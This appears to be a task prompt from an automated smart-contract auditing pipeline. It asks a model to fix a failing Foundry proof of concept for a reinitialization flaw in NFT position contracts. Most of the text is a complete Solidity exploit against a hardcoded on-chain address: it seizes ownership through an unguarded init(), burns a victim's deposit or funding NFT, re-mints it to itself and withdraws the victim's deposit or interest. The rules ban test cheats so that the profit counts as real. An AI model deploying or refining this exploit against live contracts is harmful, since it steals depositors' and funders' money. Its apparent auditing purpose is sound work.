You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can reinitialize the NFT contracts and seize deposit/funding token ownership
- claim: `NFT.init()` is external and has neither a one-time initialization guard nor access control, so any account can call it on an already-deployed deposit or funding NFT clone and transfer contract ownership to itself. The new owner then gains the owner-only `mint`/`burn` powers over the live position NFTs relied on by the pools.
- impact: An attacker can take over a pool's `depositNFT` or `fundingNFT`, burn users' position tokens, block future minting, and break the ownership checks used during withdrawals and funder payouts. This can permanently lock depositor and funder claims and DoS the pool.
- exploit_paths: ["Call `NFT.init(attacker, ...)` on the deployed deposit NFT or funding NFT contract.", "As the new owner, call `burn(tokenId)` on victim deposit/funding NFTs or interfere with future minting.", "Victim `withdraw()` / funder payout paths revert when `ownerOf()` no longer returns a valid holder for the expected NFT."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface INFTLike {
    function owner() external view returns (address);
    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function mint(address to, uint256 tokenId) external;
    function burn(uint256 tokenId) external;
}

interface IFeeModelLike {
    function getFee(uint256 interestAmount) external view returns (uint256);
}

interface IMoneyMarketLike {
    function incomeIndex() external returns (uint256);
}

interface IMPHIssuanceModelLike {
    function computeTakeBackDepositorRewardAmount(
        address pool,
        uint256 mintMPHAmount,
        bool early
    ) external view returns (uint256 takeBackAmount, uint256 devReward, uint256 govReward);
}

interface IMPHMinterLike {
    function issuanceModel() external view returns (address);
}

interface IDInterestLike {
    struct Deposit {
        uint256 amount;
        uint256 maturationTimestamp;
        uint256 interestOwed;
        uint256 initialMoneyMarketIncomeIndex;
        bool active;
        bool finalSurplusIsNegative;
        uint256 finalSurplusAmount;
        uint256 mintMPHAmount;
        uint256 depositTimestamp;
    }

    struct Funding {
        uint256 fromDepositID;
        uint256 toDepositID;
        uint256 recordedFundedDepositAmount;
        uint256 recordedMoneyMarketIncomeIndex;
        uint256 creationTimestamp;
    }

    function depositNFT() external view returns (address);
    function fundingNFT() external view returns (address);
    function stablecoin() external view returns (address);
    function feeModel() external view returns (address);
    function moneyMarket() external view returns (address);
    function mphMinter() external view returns (address);
    function depositsLength() external view returns (uint256);
    function fundingListLength() external view returns (uint256);
    function getDeposit(uint256 depositID) external view returns (Deposit memory);
    function getFunding(uint256 fundingID) external view returns (Funding memory);
    function depositIsFunded(uint256 depositID) external view returns (bool);
    function withdraw(uint256 depositID, uint256 fundingID) external;
    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
}

contract FlawVerifier {
    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;

    address private _profitToken;
    uint256 private _profitAmount;

    address public pool;
    uint256 public hijackedTokenId;
    uint256 public linkedFundingId;
    bool public targetIsDepositNFT;
    bool public targetIsFundingNFT;
    bool public hypothesisValidated;
    bool public burnedVictimToken;
    bool public demonstratedPathRevert;
    string public exploitPath;
    string public failureReason;

    constructor() {}

    function executeOnOpportunity() public {
        if (hypothesisValidated || bytes(failureReason).length != 0) {
            return;
        }

        INFTLike nft = INFTLike(TARGET);
        address originalOwner = nft.owner();
        pool = originalOwner;
        if (pool == address(0)) {
            failureReason = "target owner is zero";
            return;
        }

        IDInterestLike market = IDInterestLike(pool);
        address stable = market.stablecoin();
        _profitToken = stable;
        uint256 balanceBefore = IERC20Like(stable).balanceOf(address(this));

        address depositNFTAddr = market.depositNFT();
        address fundingNFTAddr = market.fundingNFT();
        targetIsDepositNFT = depositNFTAddr == TARGET;
        targetIsFundingNFT = fundingNFTAddr == TARGET;
        if (!targetIsDepositNFT && !targetIsFundingNFT) {
            failureReason = "target NFT not wired as pool depositNFT/fundingNFT";
            return;
        }

        nft.init(address(this), "hijacked", "HIJACKED");
        if (nft.owner() != address(this)) {
            failureReason = "reinitialization failed";
            return;
        }
        hypothesisValidated = true;

        if (targetIsFundingNFT) {
            exploitPath = "init -> burn fundingNFT -> payInterestToFunder reverts -> remint same fundingNFT -> steal accrued funder interest";
            _executeFundingPath(market, nft);
        } else {
            exploitPath = "init -> burn depositNFT -> withdraw/earlyWithdraw reverts -> remint same depositNFT -> steal deposit withdrawal";
            _executeDepositPath(market, nft);
        }

        uint256 balanceAfter = IERC20Like(stable).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeFundingPath(IDInterestLike market, INFTLike nft) internal {
        (uint256 fundingID, uint256 claimable) = _findBestFundingCandidate(market, nft);
        if (fundingID == 0) {
            failureReason = "no minted fundingNFT found";
            return;
        }
        hijackedTokenId = fundingID;

        nft.burn(fundingID);
        burnedVictimToken = true;

        (bool reverted, ) = _callPayInterestToFunder(address(market), fundingID);
        demonstratedPathRevert = reverted;

        nft.mint(address(this), fundingID);
        linkedFundingId = fundingID;

        if (claimable == 0) {
            failureReason = "fundingNFT takeover validated but no accrued interest claimable at fork block";
            return;
        }

        market.payInterestToFunder(fundingID);
    }

    function _executeDepositPath(IDInterestLike market, INFTLike nft) internal {
        (uint256 depositID, bool early, uint256 expectedPayout) = _findBestDepositCandidate(market, nft);
        if (depositID == 0) {
            failureReason = "no active deposit with zero MPH clawback found";
            return;
        }
        hijackedTokenId = depositID;
        linkedFundingId = market.depositIsFunded(depositID) ? _findFundingForDeposit(market, depositID) : 0;

        nft.burn(depositID);
        burnedVictimToken = true;

        (bool reverted, ) = early
            ? _callEarlyWithdraw(address(market), depositID, linkedFundingId)
            : _callWithdraw(address(market), depositID, linkedFundingId);
        demonstratedPathRevert = reverted;

        nft.mint(address(this), depositID);

        if (expectedPayout == 0) {
            failureReason = "depositNFT takeover validated but expected payout is zero";
            return;
        }

        if (early) {
            market.earlyWithdraw(depositID, linkedFundingId);
        } else {
            market.withdraw(depositID, linkedFundingId);
        }
    }

    function _findBestFundingCandidate(IDInterestLike market, INFTLike nft)
        internal
        returns (uint256 bestFundingId, uint256 bestClaimable)
    {
        uint256 len = market.fundingListLength();
        if (len == 0) {
            return (0, 0);
        }

        uint256 currentIncomeIndex = IMoneyMarketLike(market.moneyMarket()).incomeIndex();
        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
            if (!_tokenExists(nft, fundingID)) {
                continue;
            }
            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
            if (funding.recordedMoneyMarketIncomeIndex == 0 || funding.recordedFundedDepositAmount == 0) {
                if (bestFundingId == 0) {
                    bestFundingId = fundingID;
                }
                continue;
            }

            uint256 claimable = (funding.recordedFundedDepositAmount * currentIncomeIndex) /
                funding.recordedMoneyMarketIncomeIndex;
            if (claimable > funding.recordedFundedDepositAmount) {
                claimable -= funding.recordedFundedDepositAmount;
            } else {
                claimable = 0;
            }

            if (claimable > bestClaimable) {
                bestClaimable = claimable;
                bestFundingId = fundingID;
            }
        }
    }

    function _findBestDepositCandidate(IDInterestLike market, INFTLike nft)
        internal
        view
        returns (uint256 bestDepositId, bool bestEarly, uint256 bestExpectedPayout)
    {
        uint256 len = market.depositsLength();
        if (len == 0) {
            return (0, false, 0);
        }

        address issuanceModel = IMPHMinterLike(market.mphMinter()).issuanceModel();
        IFeeModelLike feeModel = IFeeModelLike(market.feeModel());

        for (uint256 depositID = 1; depositID <= len; depositID++) {
            if (!_tokenExists(nft, depositID)) {
                continue;
            }

            IDInterestLike.Deposit memory deposit = market.getDeposit(depositID);
            if (!deposit.active) {
                continue;
            }

            bool early = block.timestamp < deposit.maturationTimestamp;
            (uint256 takeBackAmount, , ) = IMPHIssuanceModelLike(issuanceModel)
                .computeTakeBackDepositorRewardAmount(pool, deposit.mintMPHAmount, early);
            if (takeBackAmount != 0) {
                continue;
            }

            uint256 expectedPayout = early
                ? deposit.amount
                : deposit.amount + deposit.interestOwed - feeModel.getFee(deposit.interestOwed);

            if (expectedPayout > bestExpectedPayout) {
                bestExpectedPayout = expectedPayout;
                bestDepositId = depositID;
                bestEarly = early;
            }
        }
    }

    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
        uint256 len = market.fundingListLength();
        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
                return fundingID;
            }
        }
        return 0;
    }

    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
        try nft.ownerOf(tokenId) returns (address owner_) {
            return owner_ != address(0);
        } catch {
            return false;
        }
    }

    function _callWithdraw(address market, uint256 depositID, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("withdraw(uint256,uint256)", depositID, fundingID)
        );
        return (!ok, data);
    }

    function _callEarlyWithdraw(address market, uint256 depositID, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("earlyWithdraw(uint256,uint256)", depositID, fundingID)
        );
        return (!ok, data);
    }

    function _callPayInterestToFunder(address market, uint256 fundingID)
        internal
        returns (bool reverted, bytes memory returndata)
    {
        (bool ok, bytes memory data) = market.call(
            abi.encodeWithSignature("payInterestToFunder(uint256)", fundingID)
        );
        return (!ok, data);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: nft.init(attacker, ...), burn(tokenid), withdraw(), ownerof(); generated code does not cover paths indexes: 0, 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
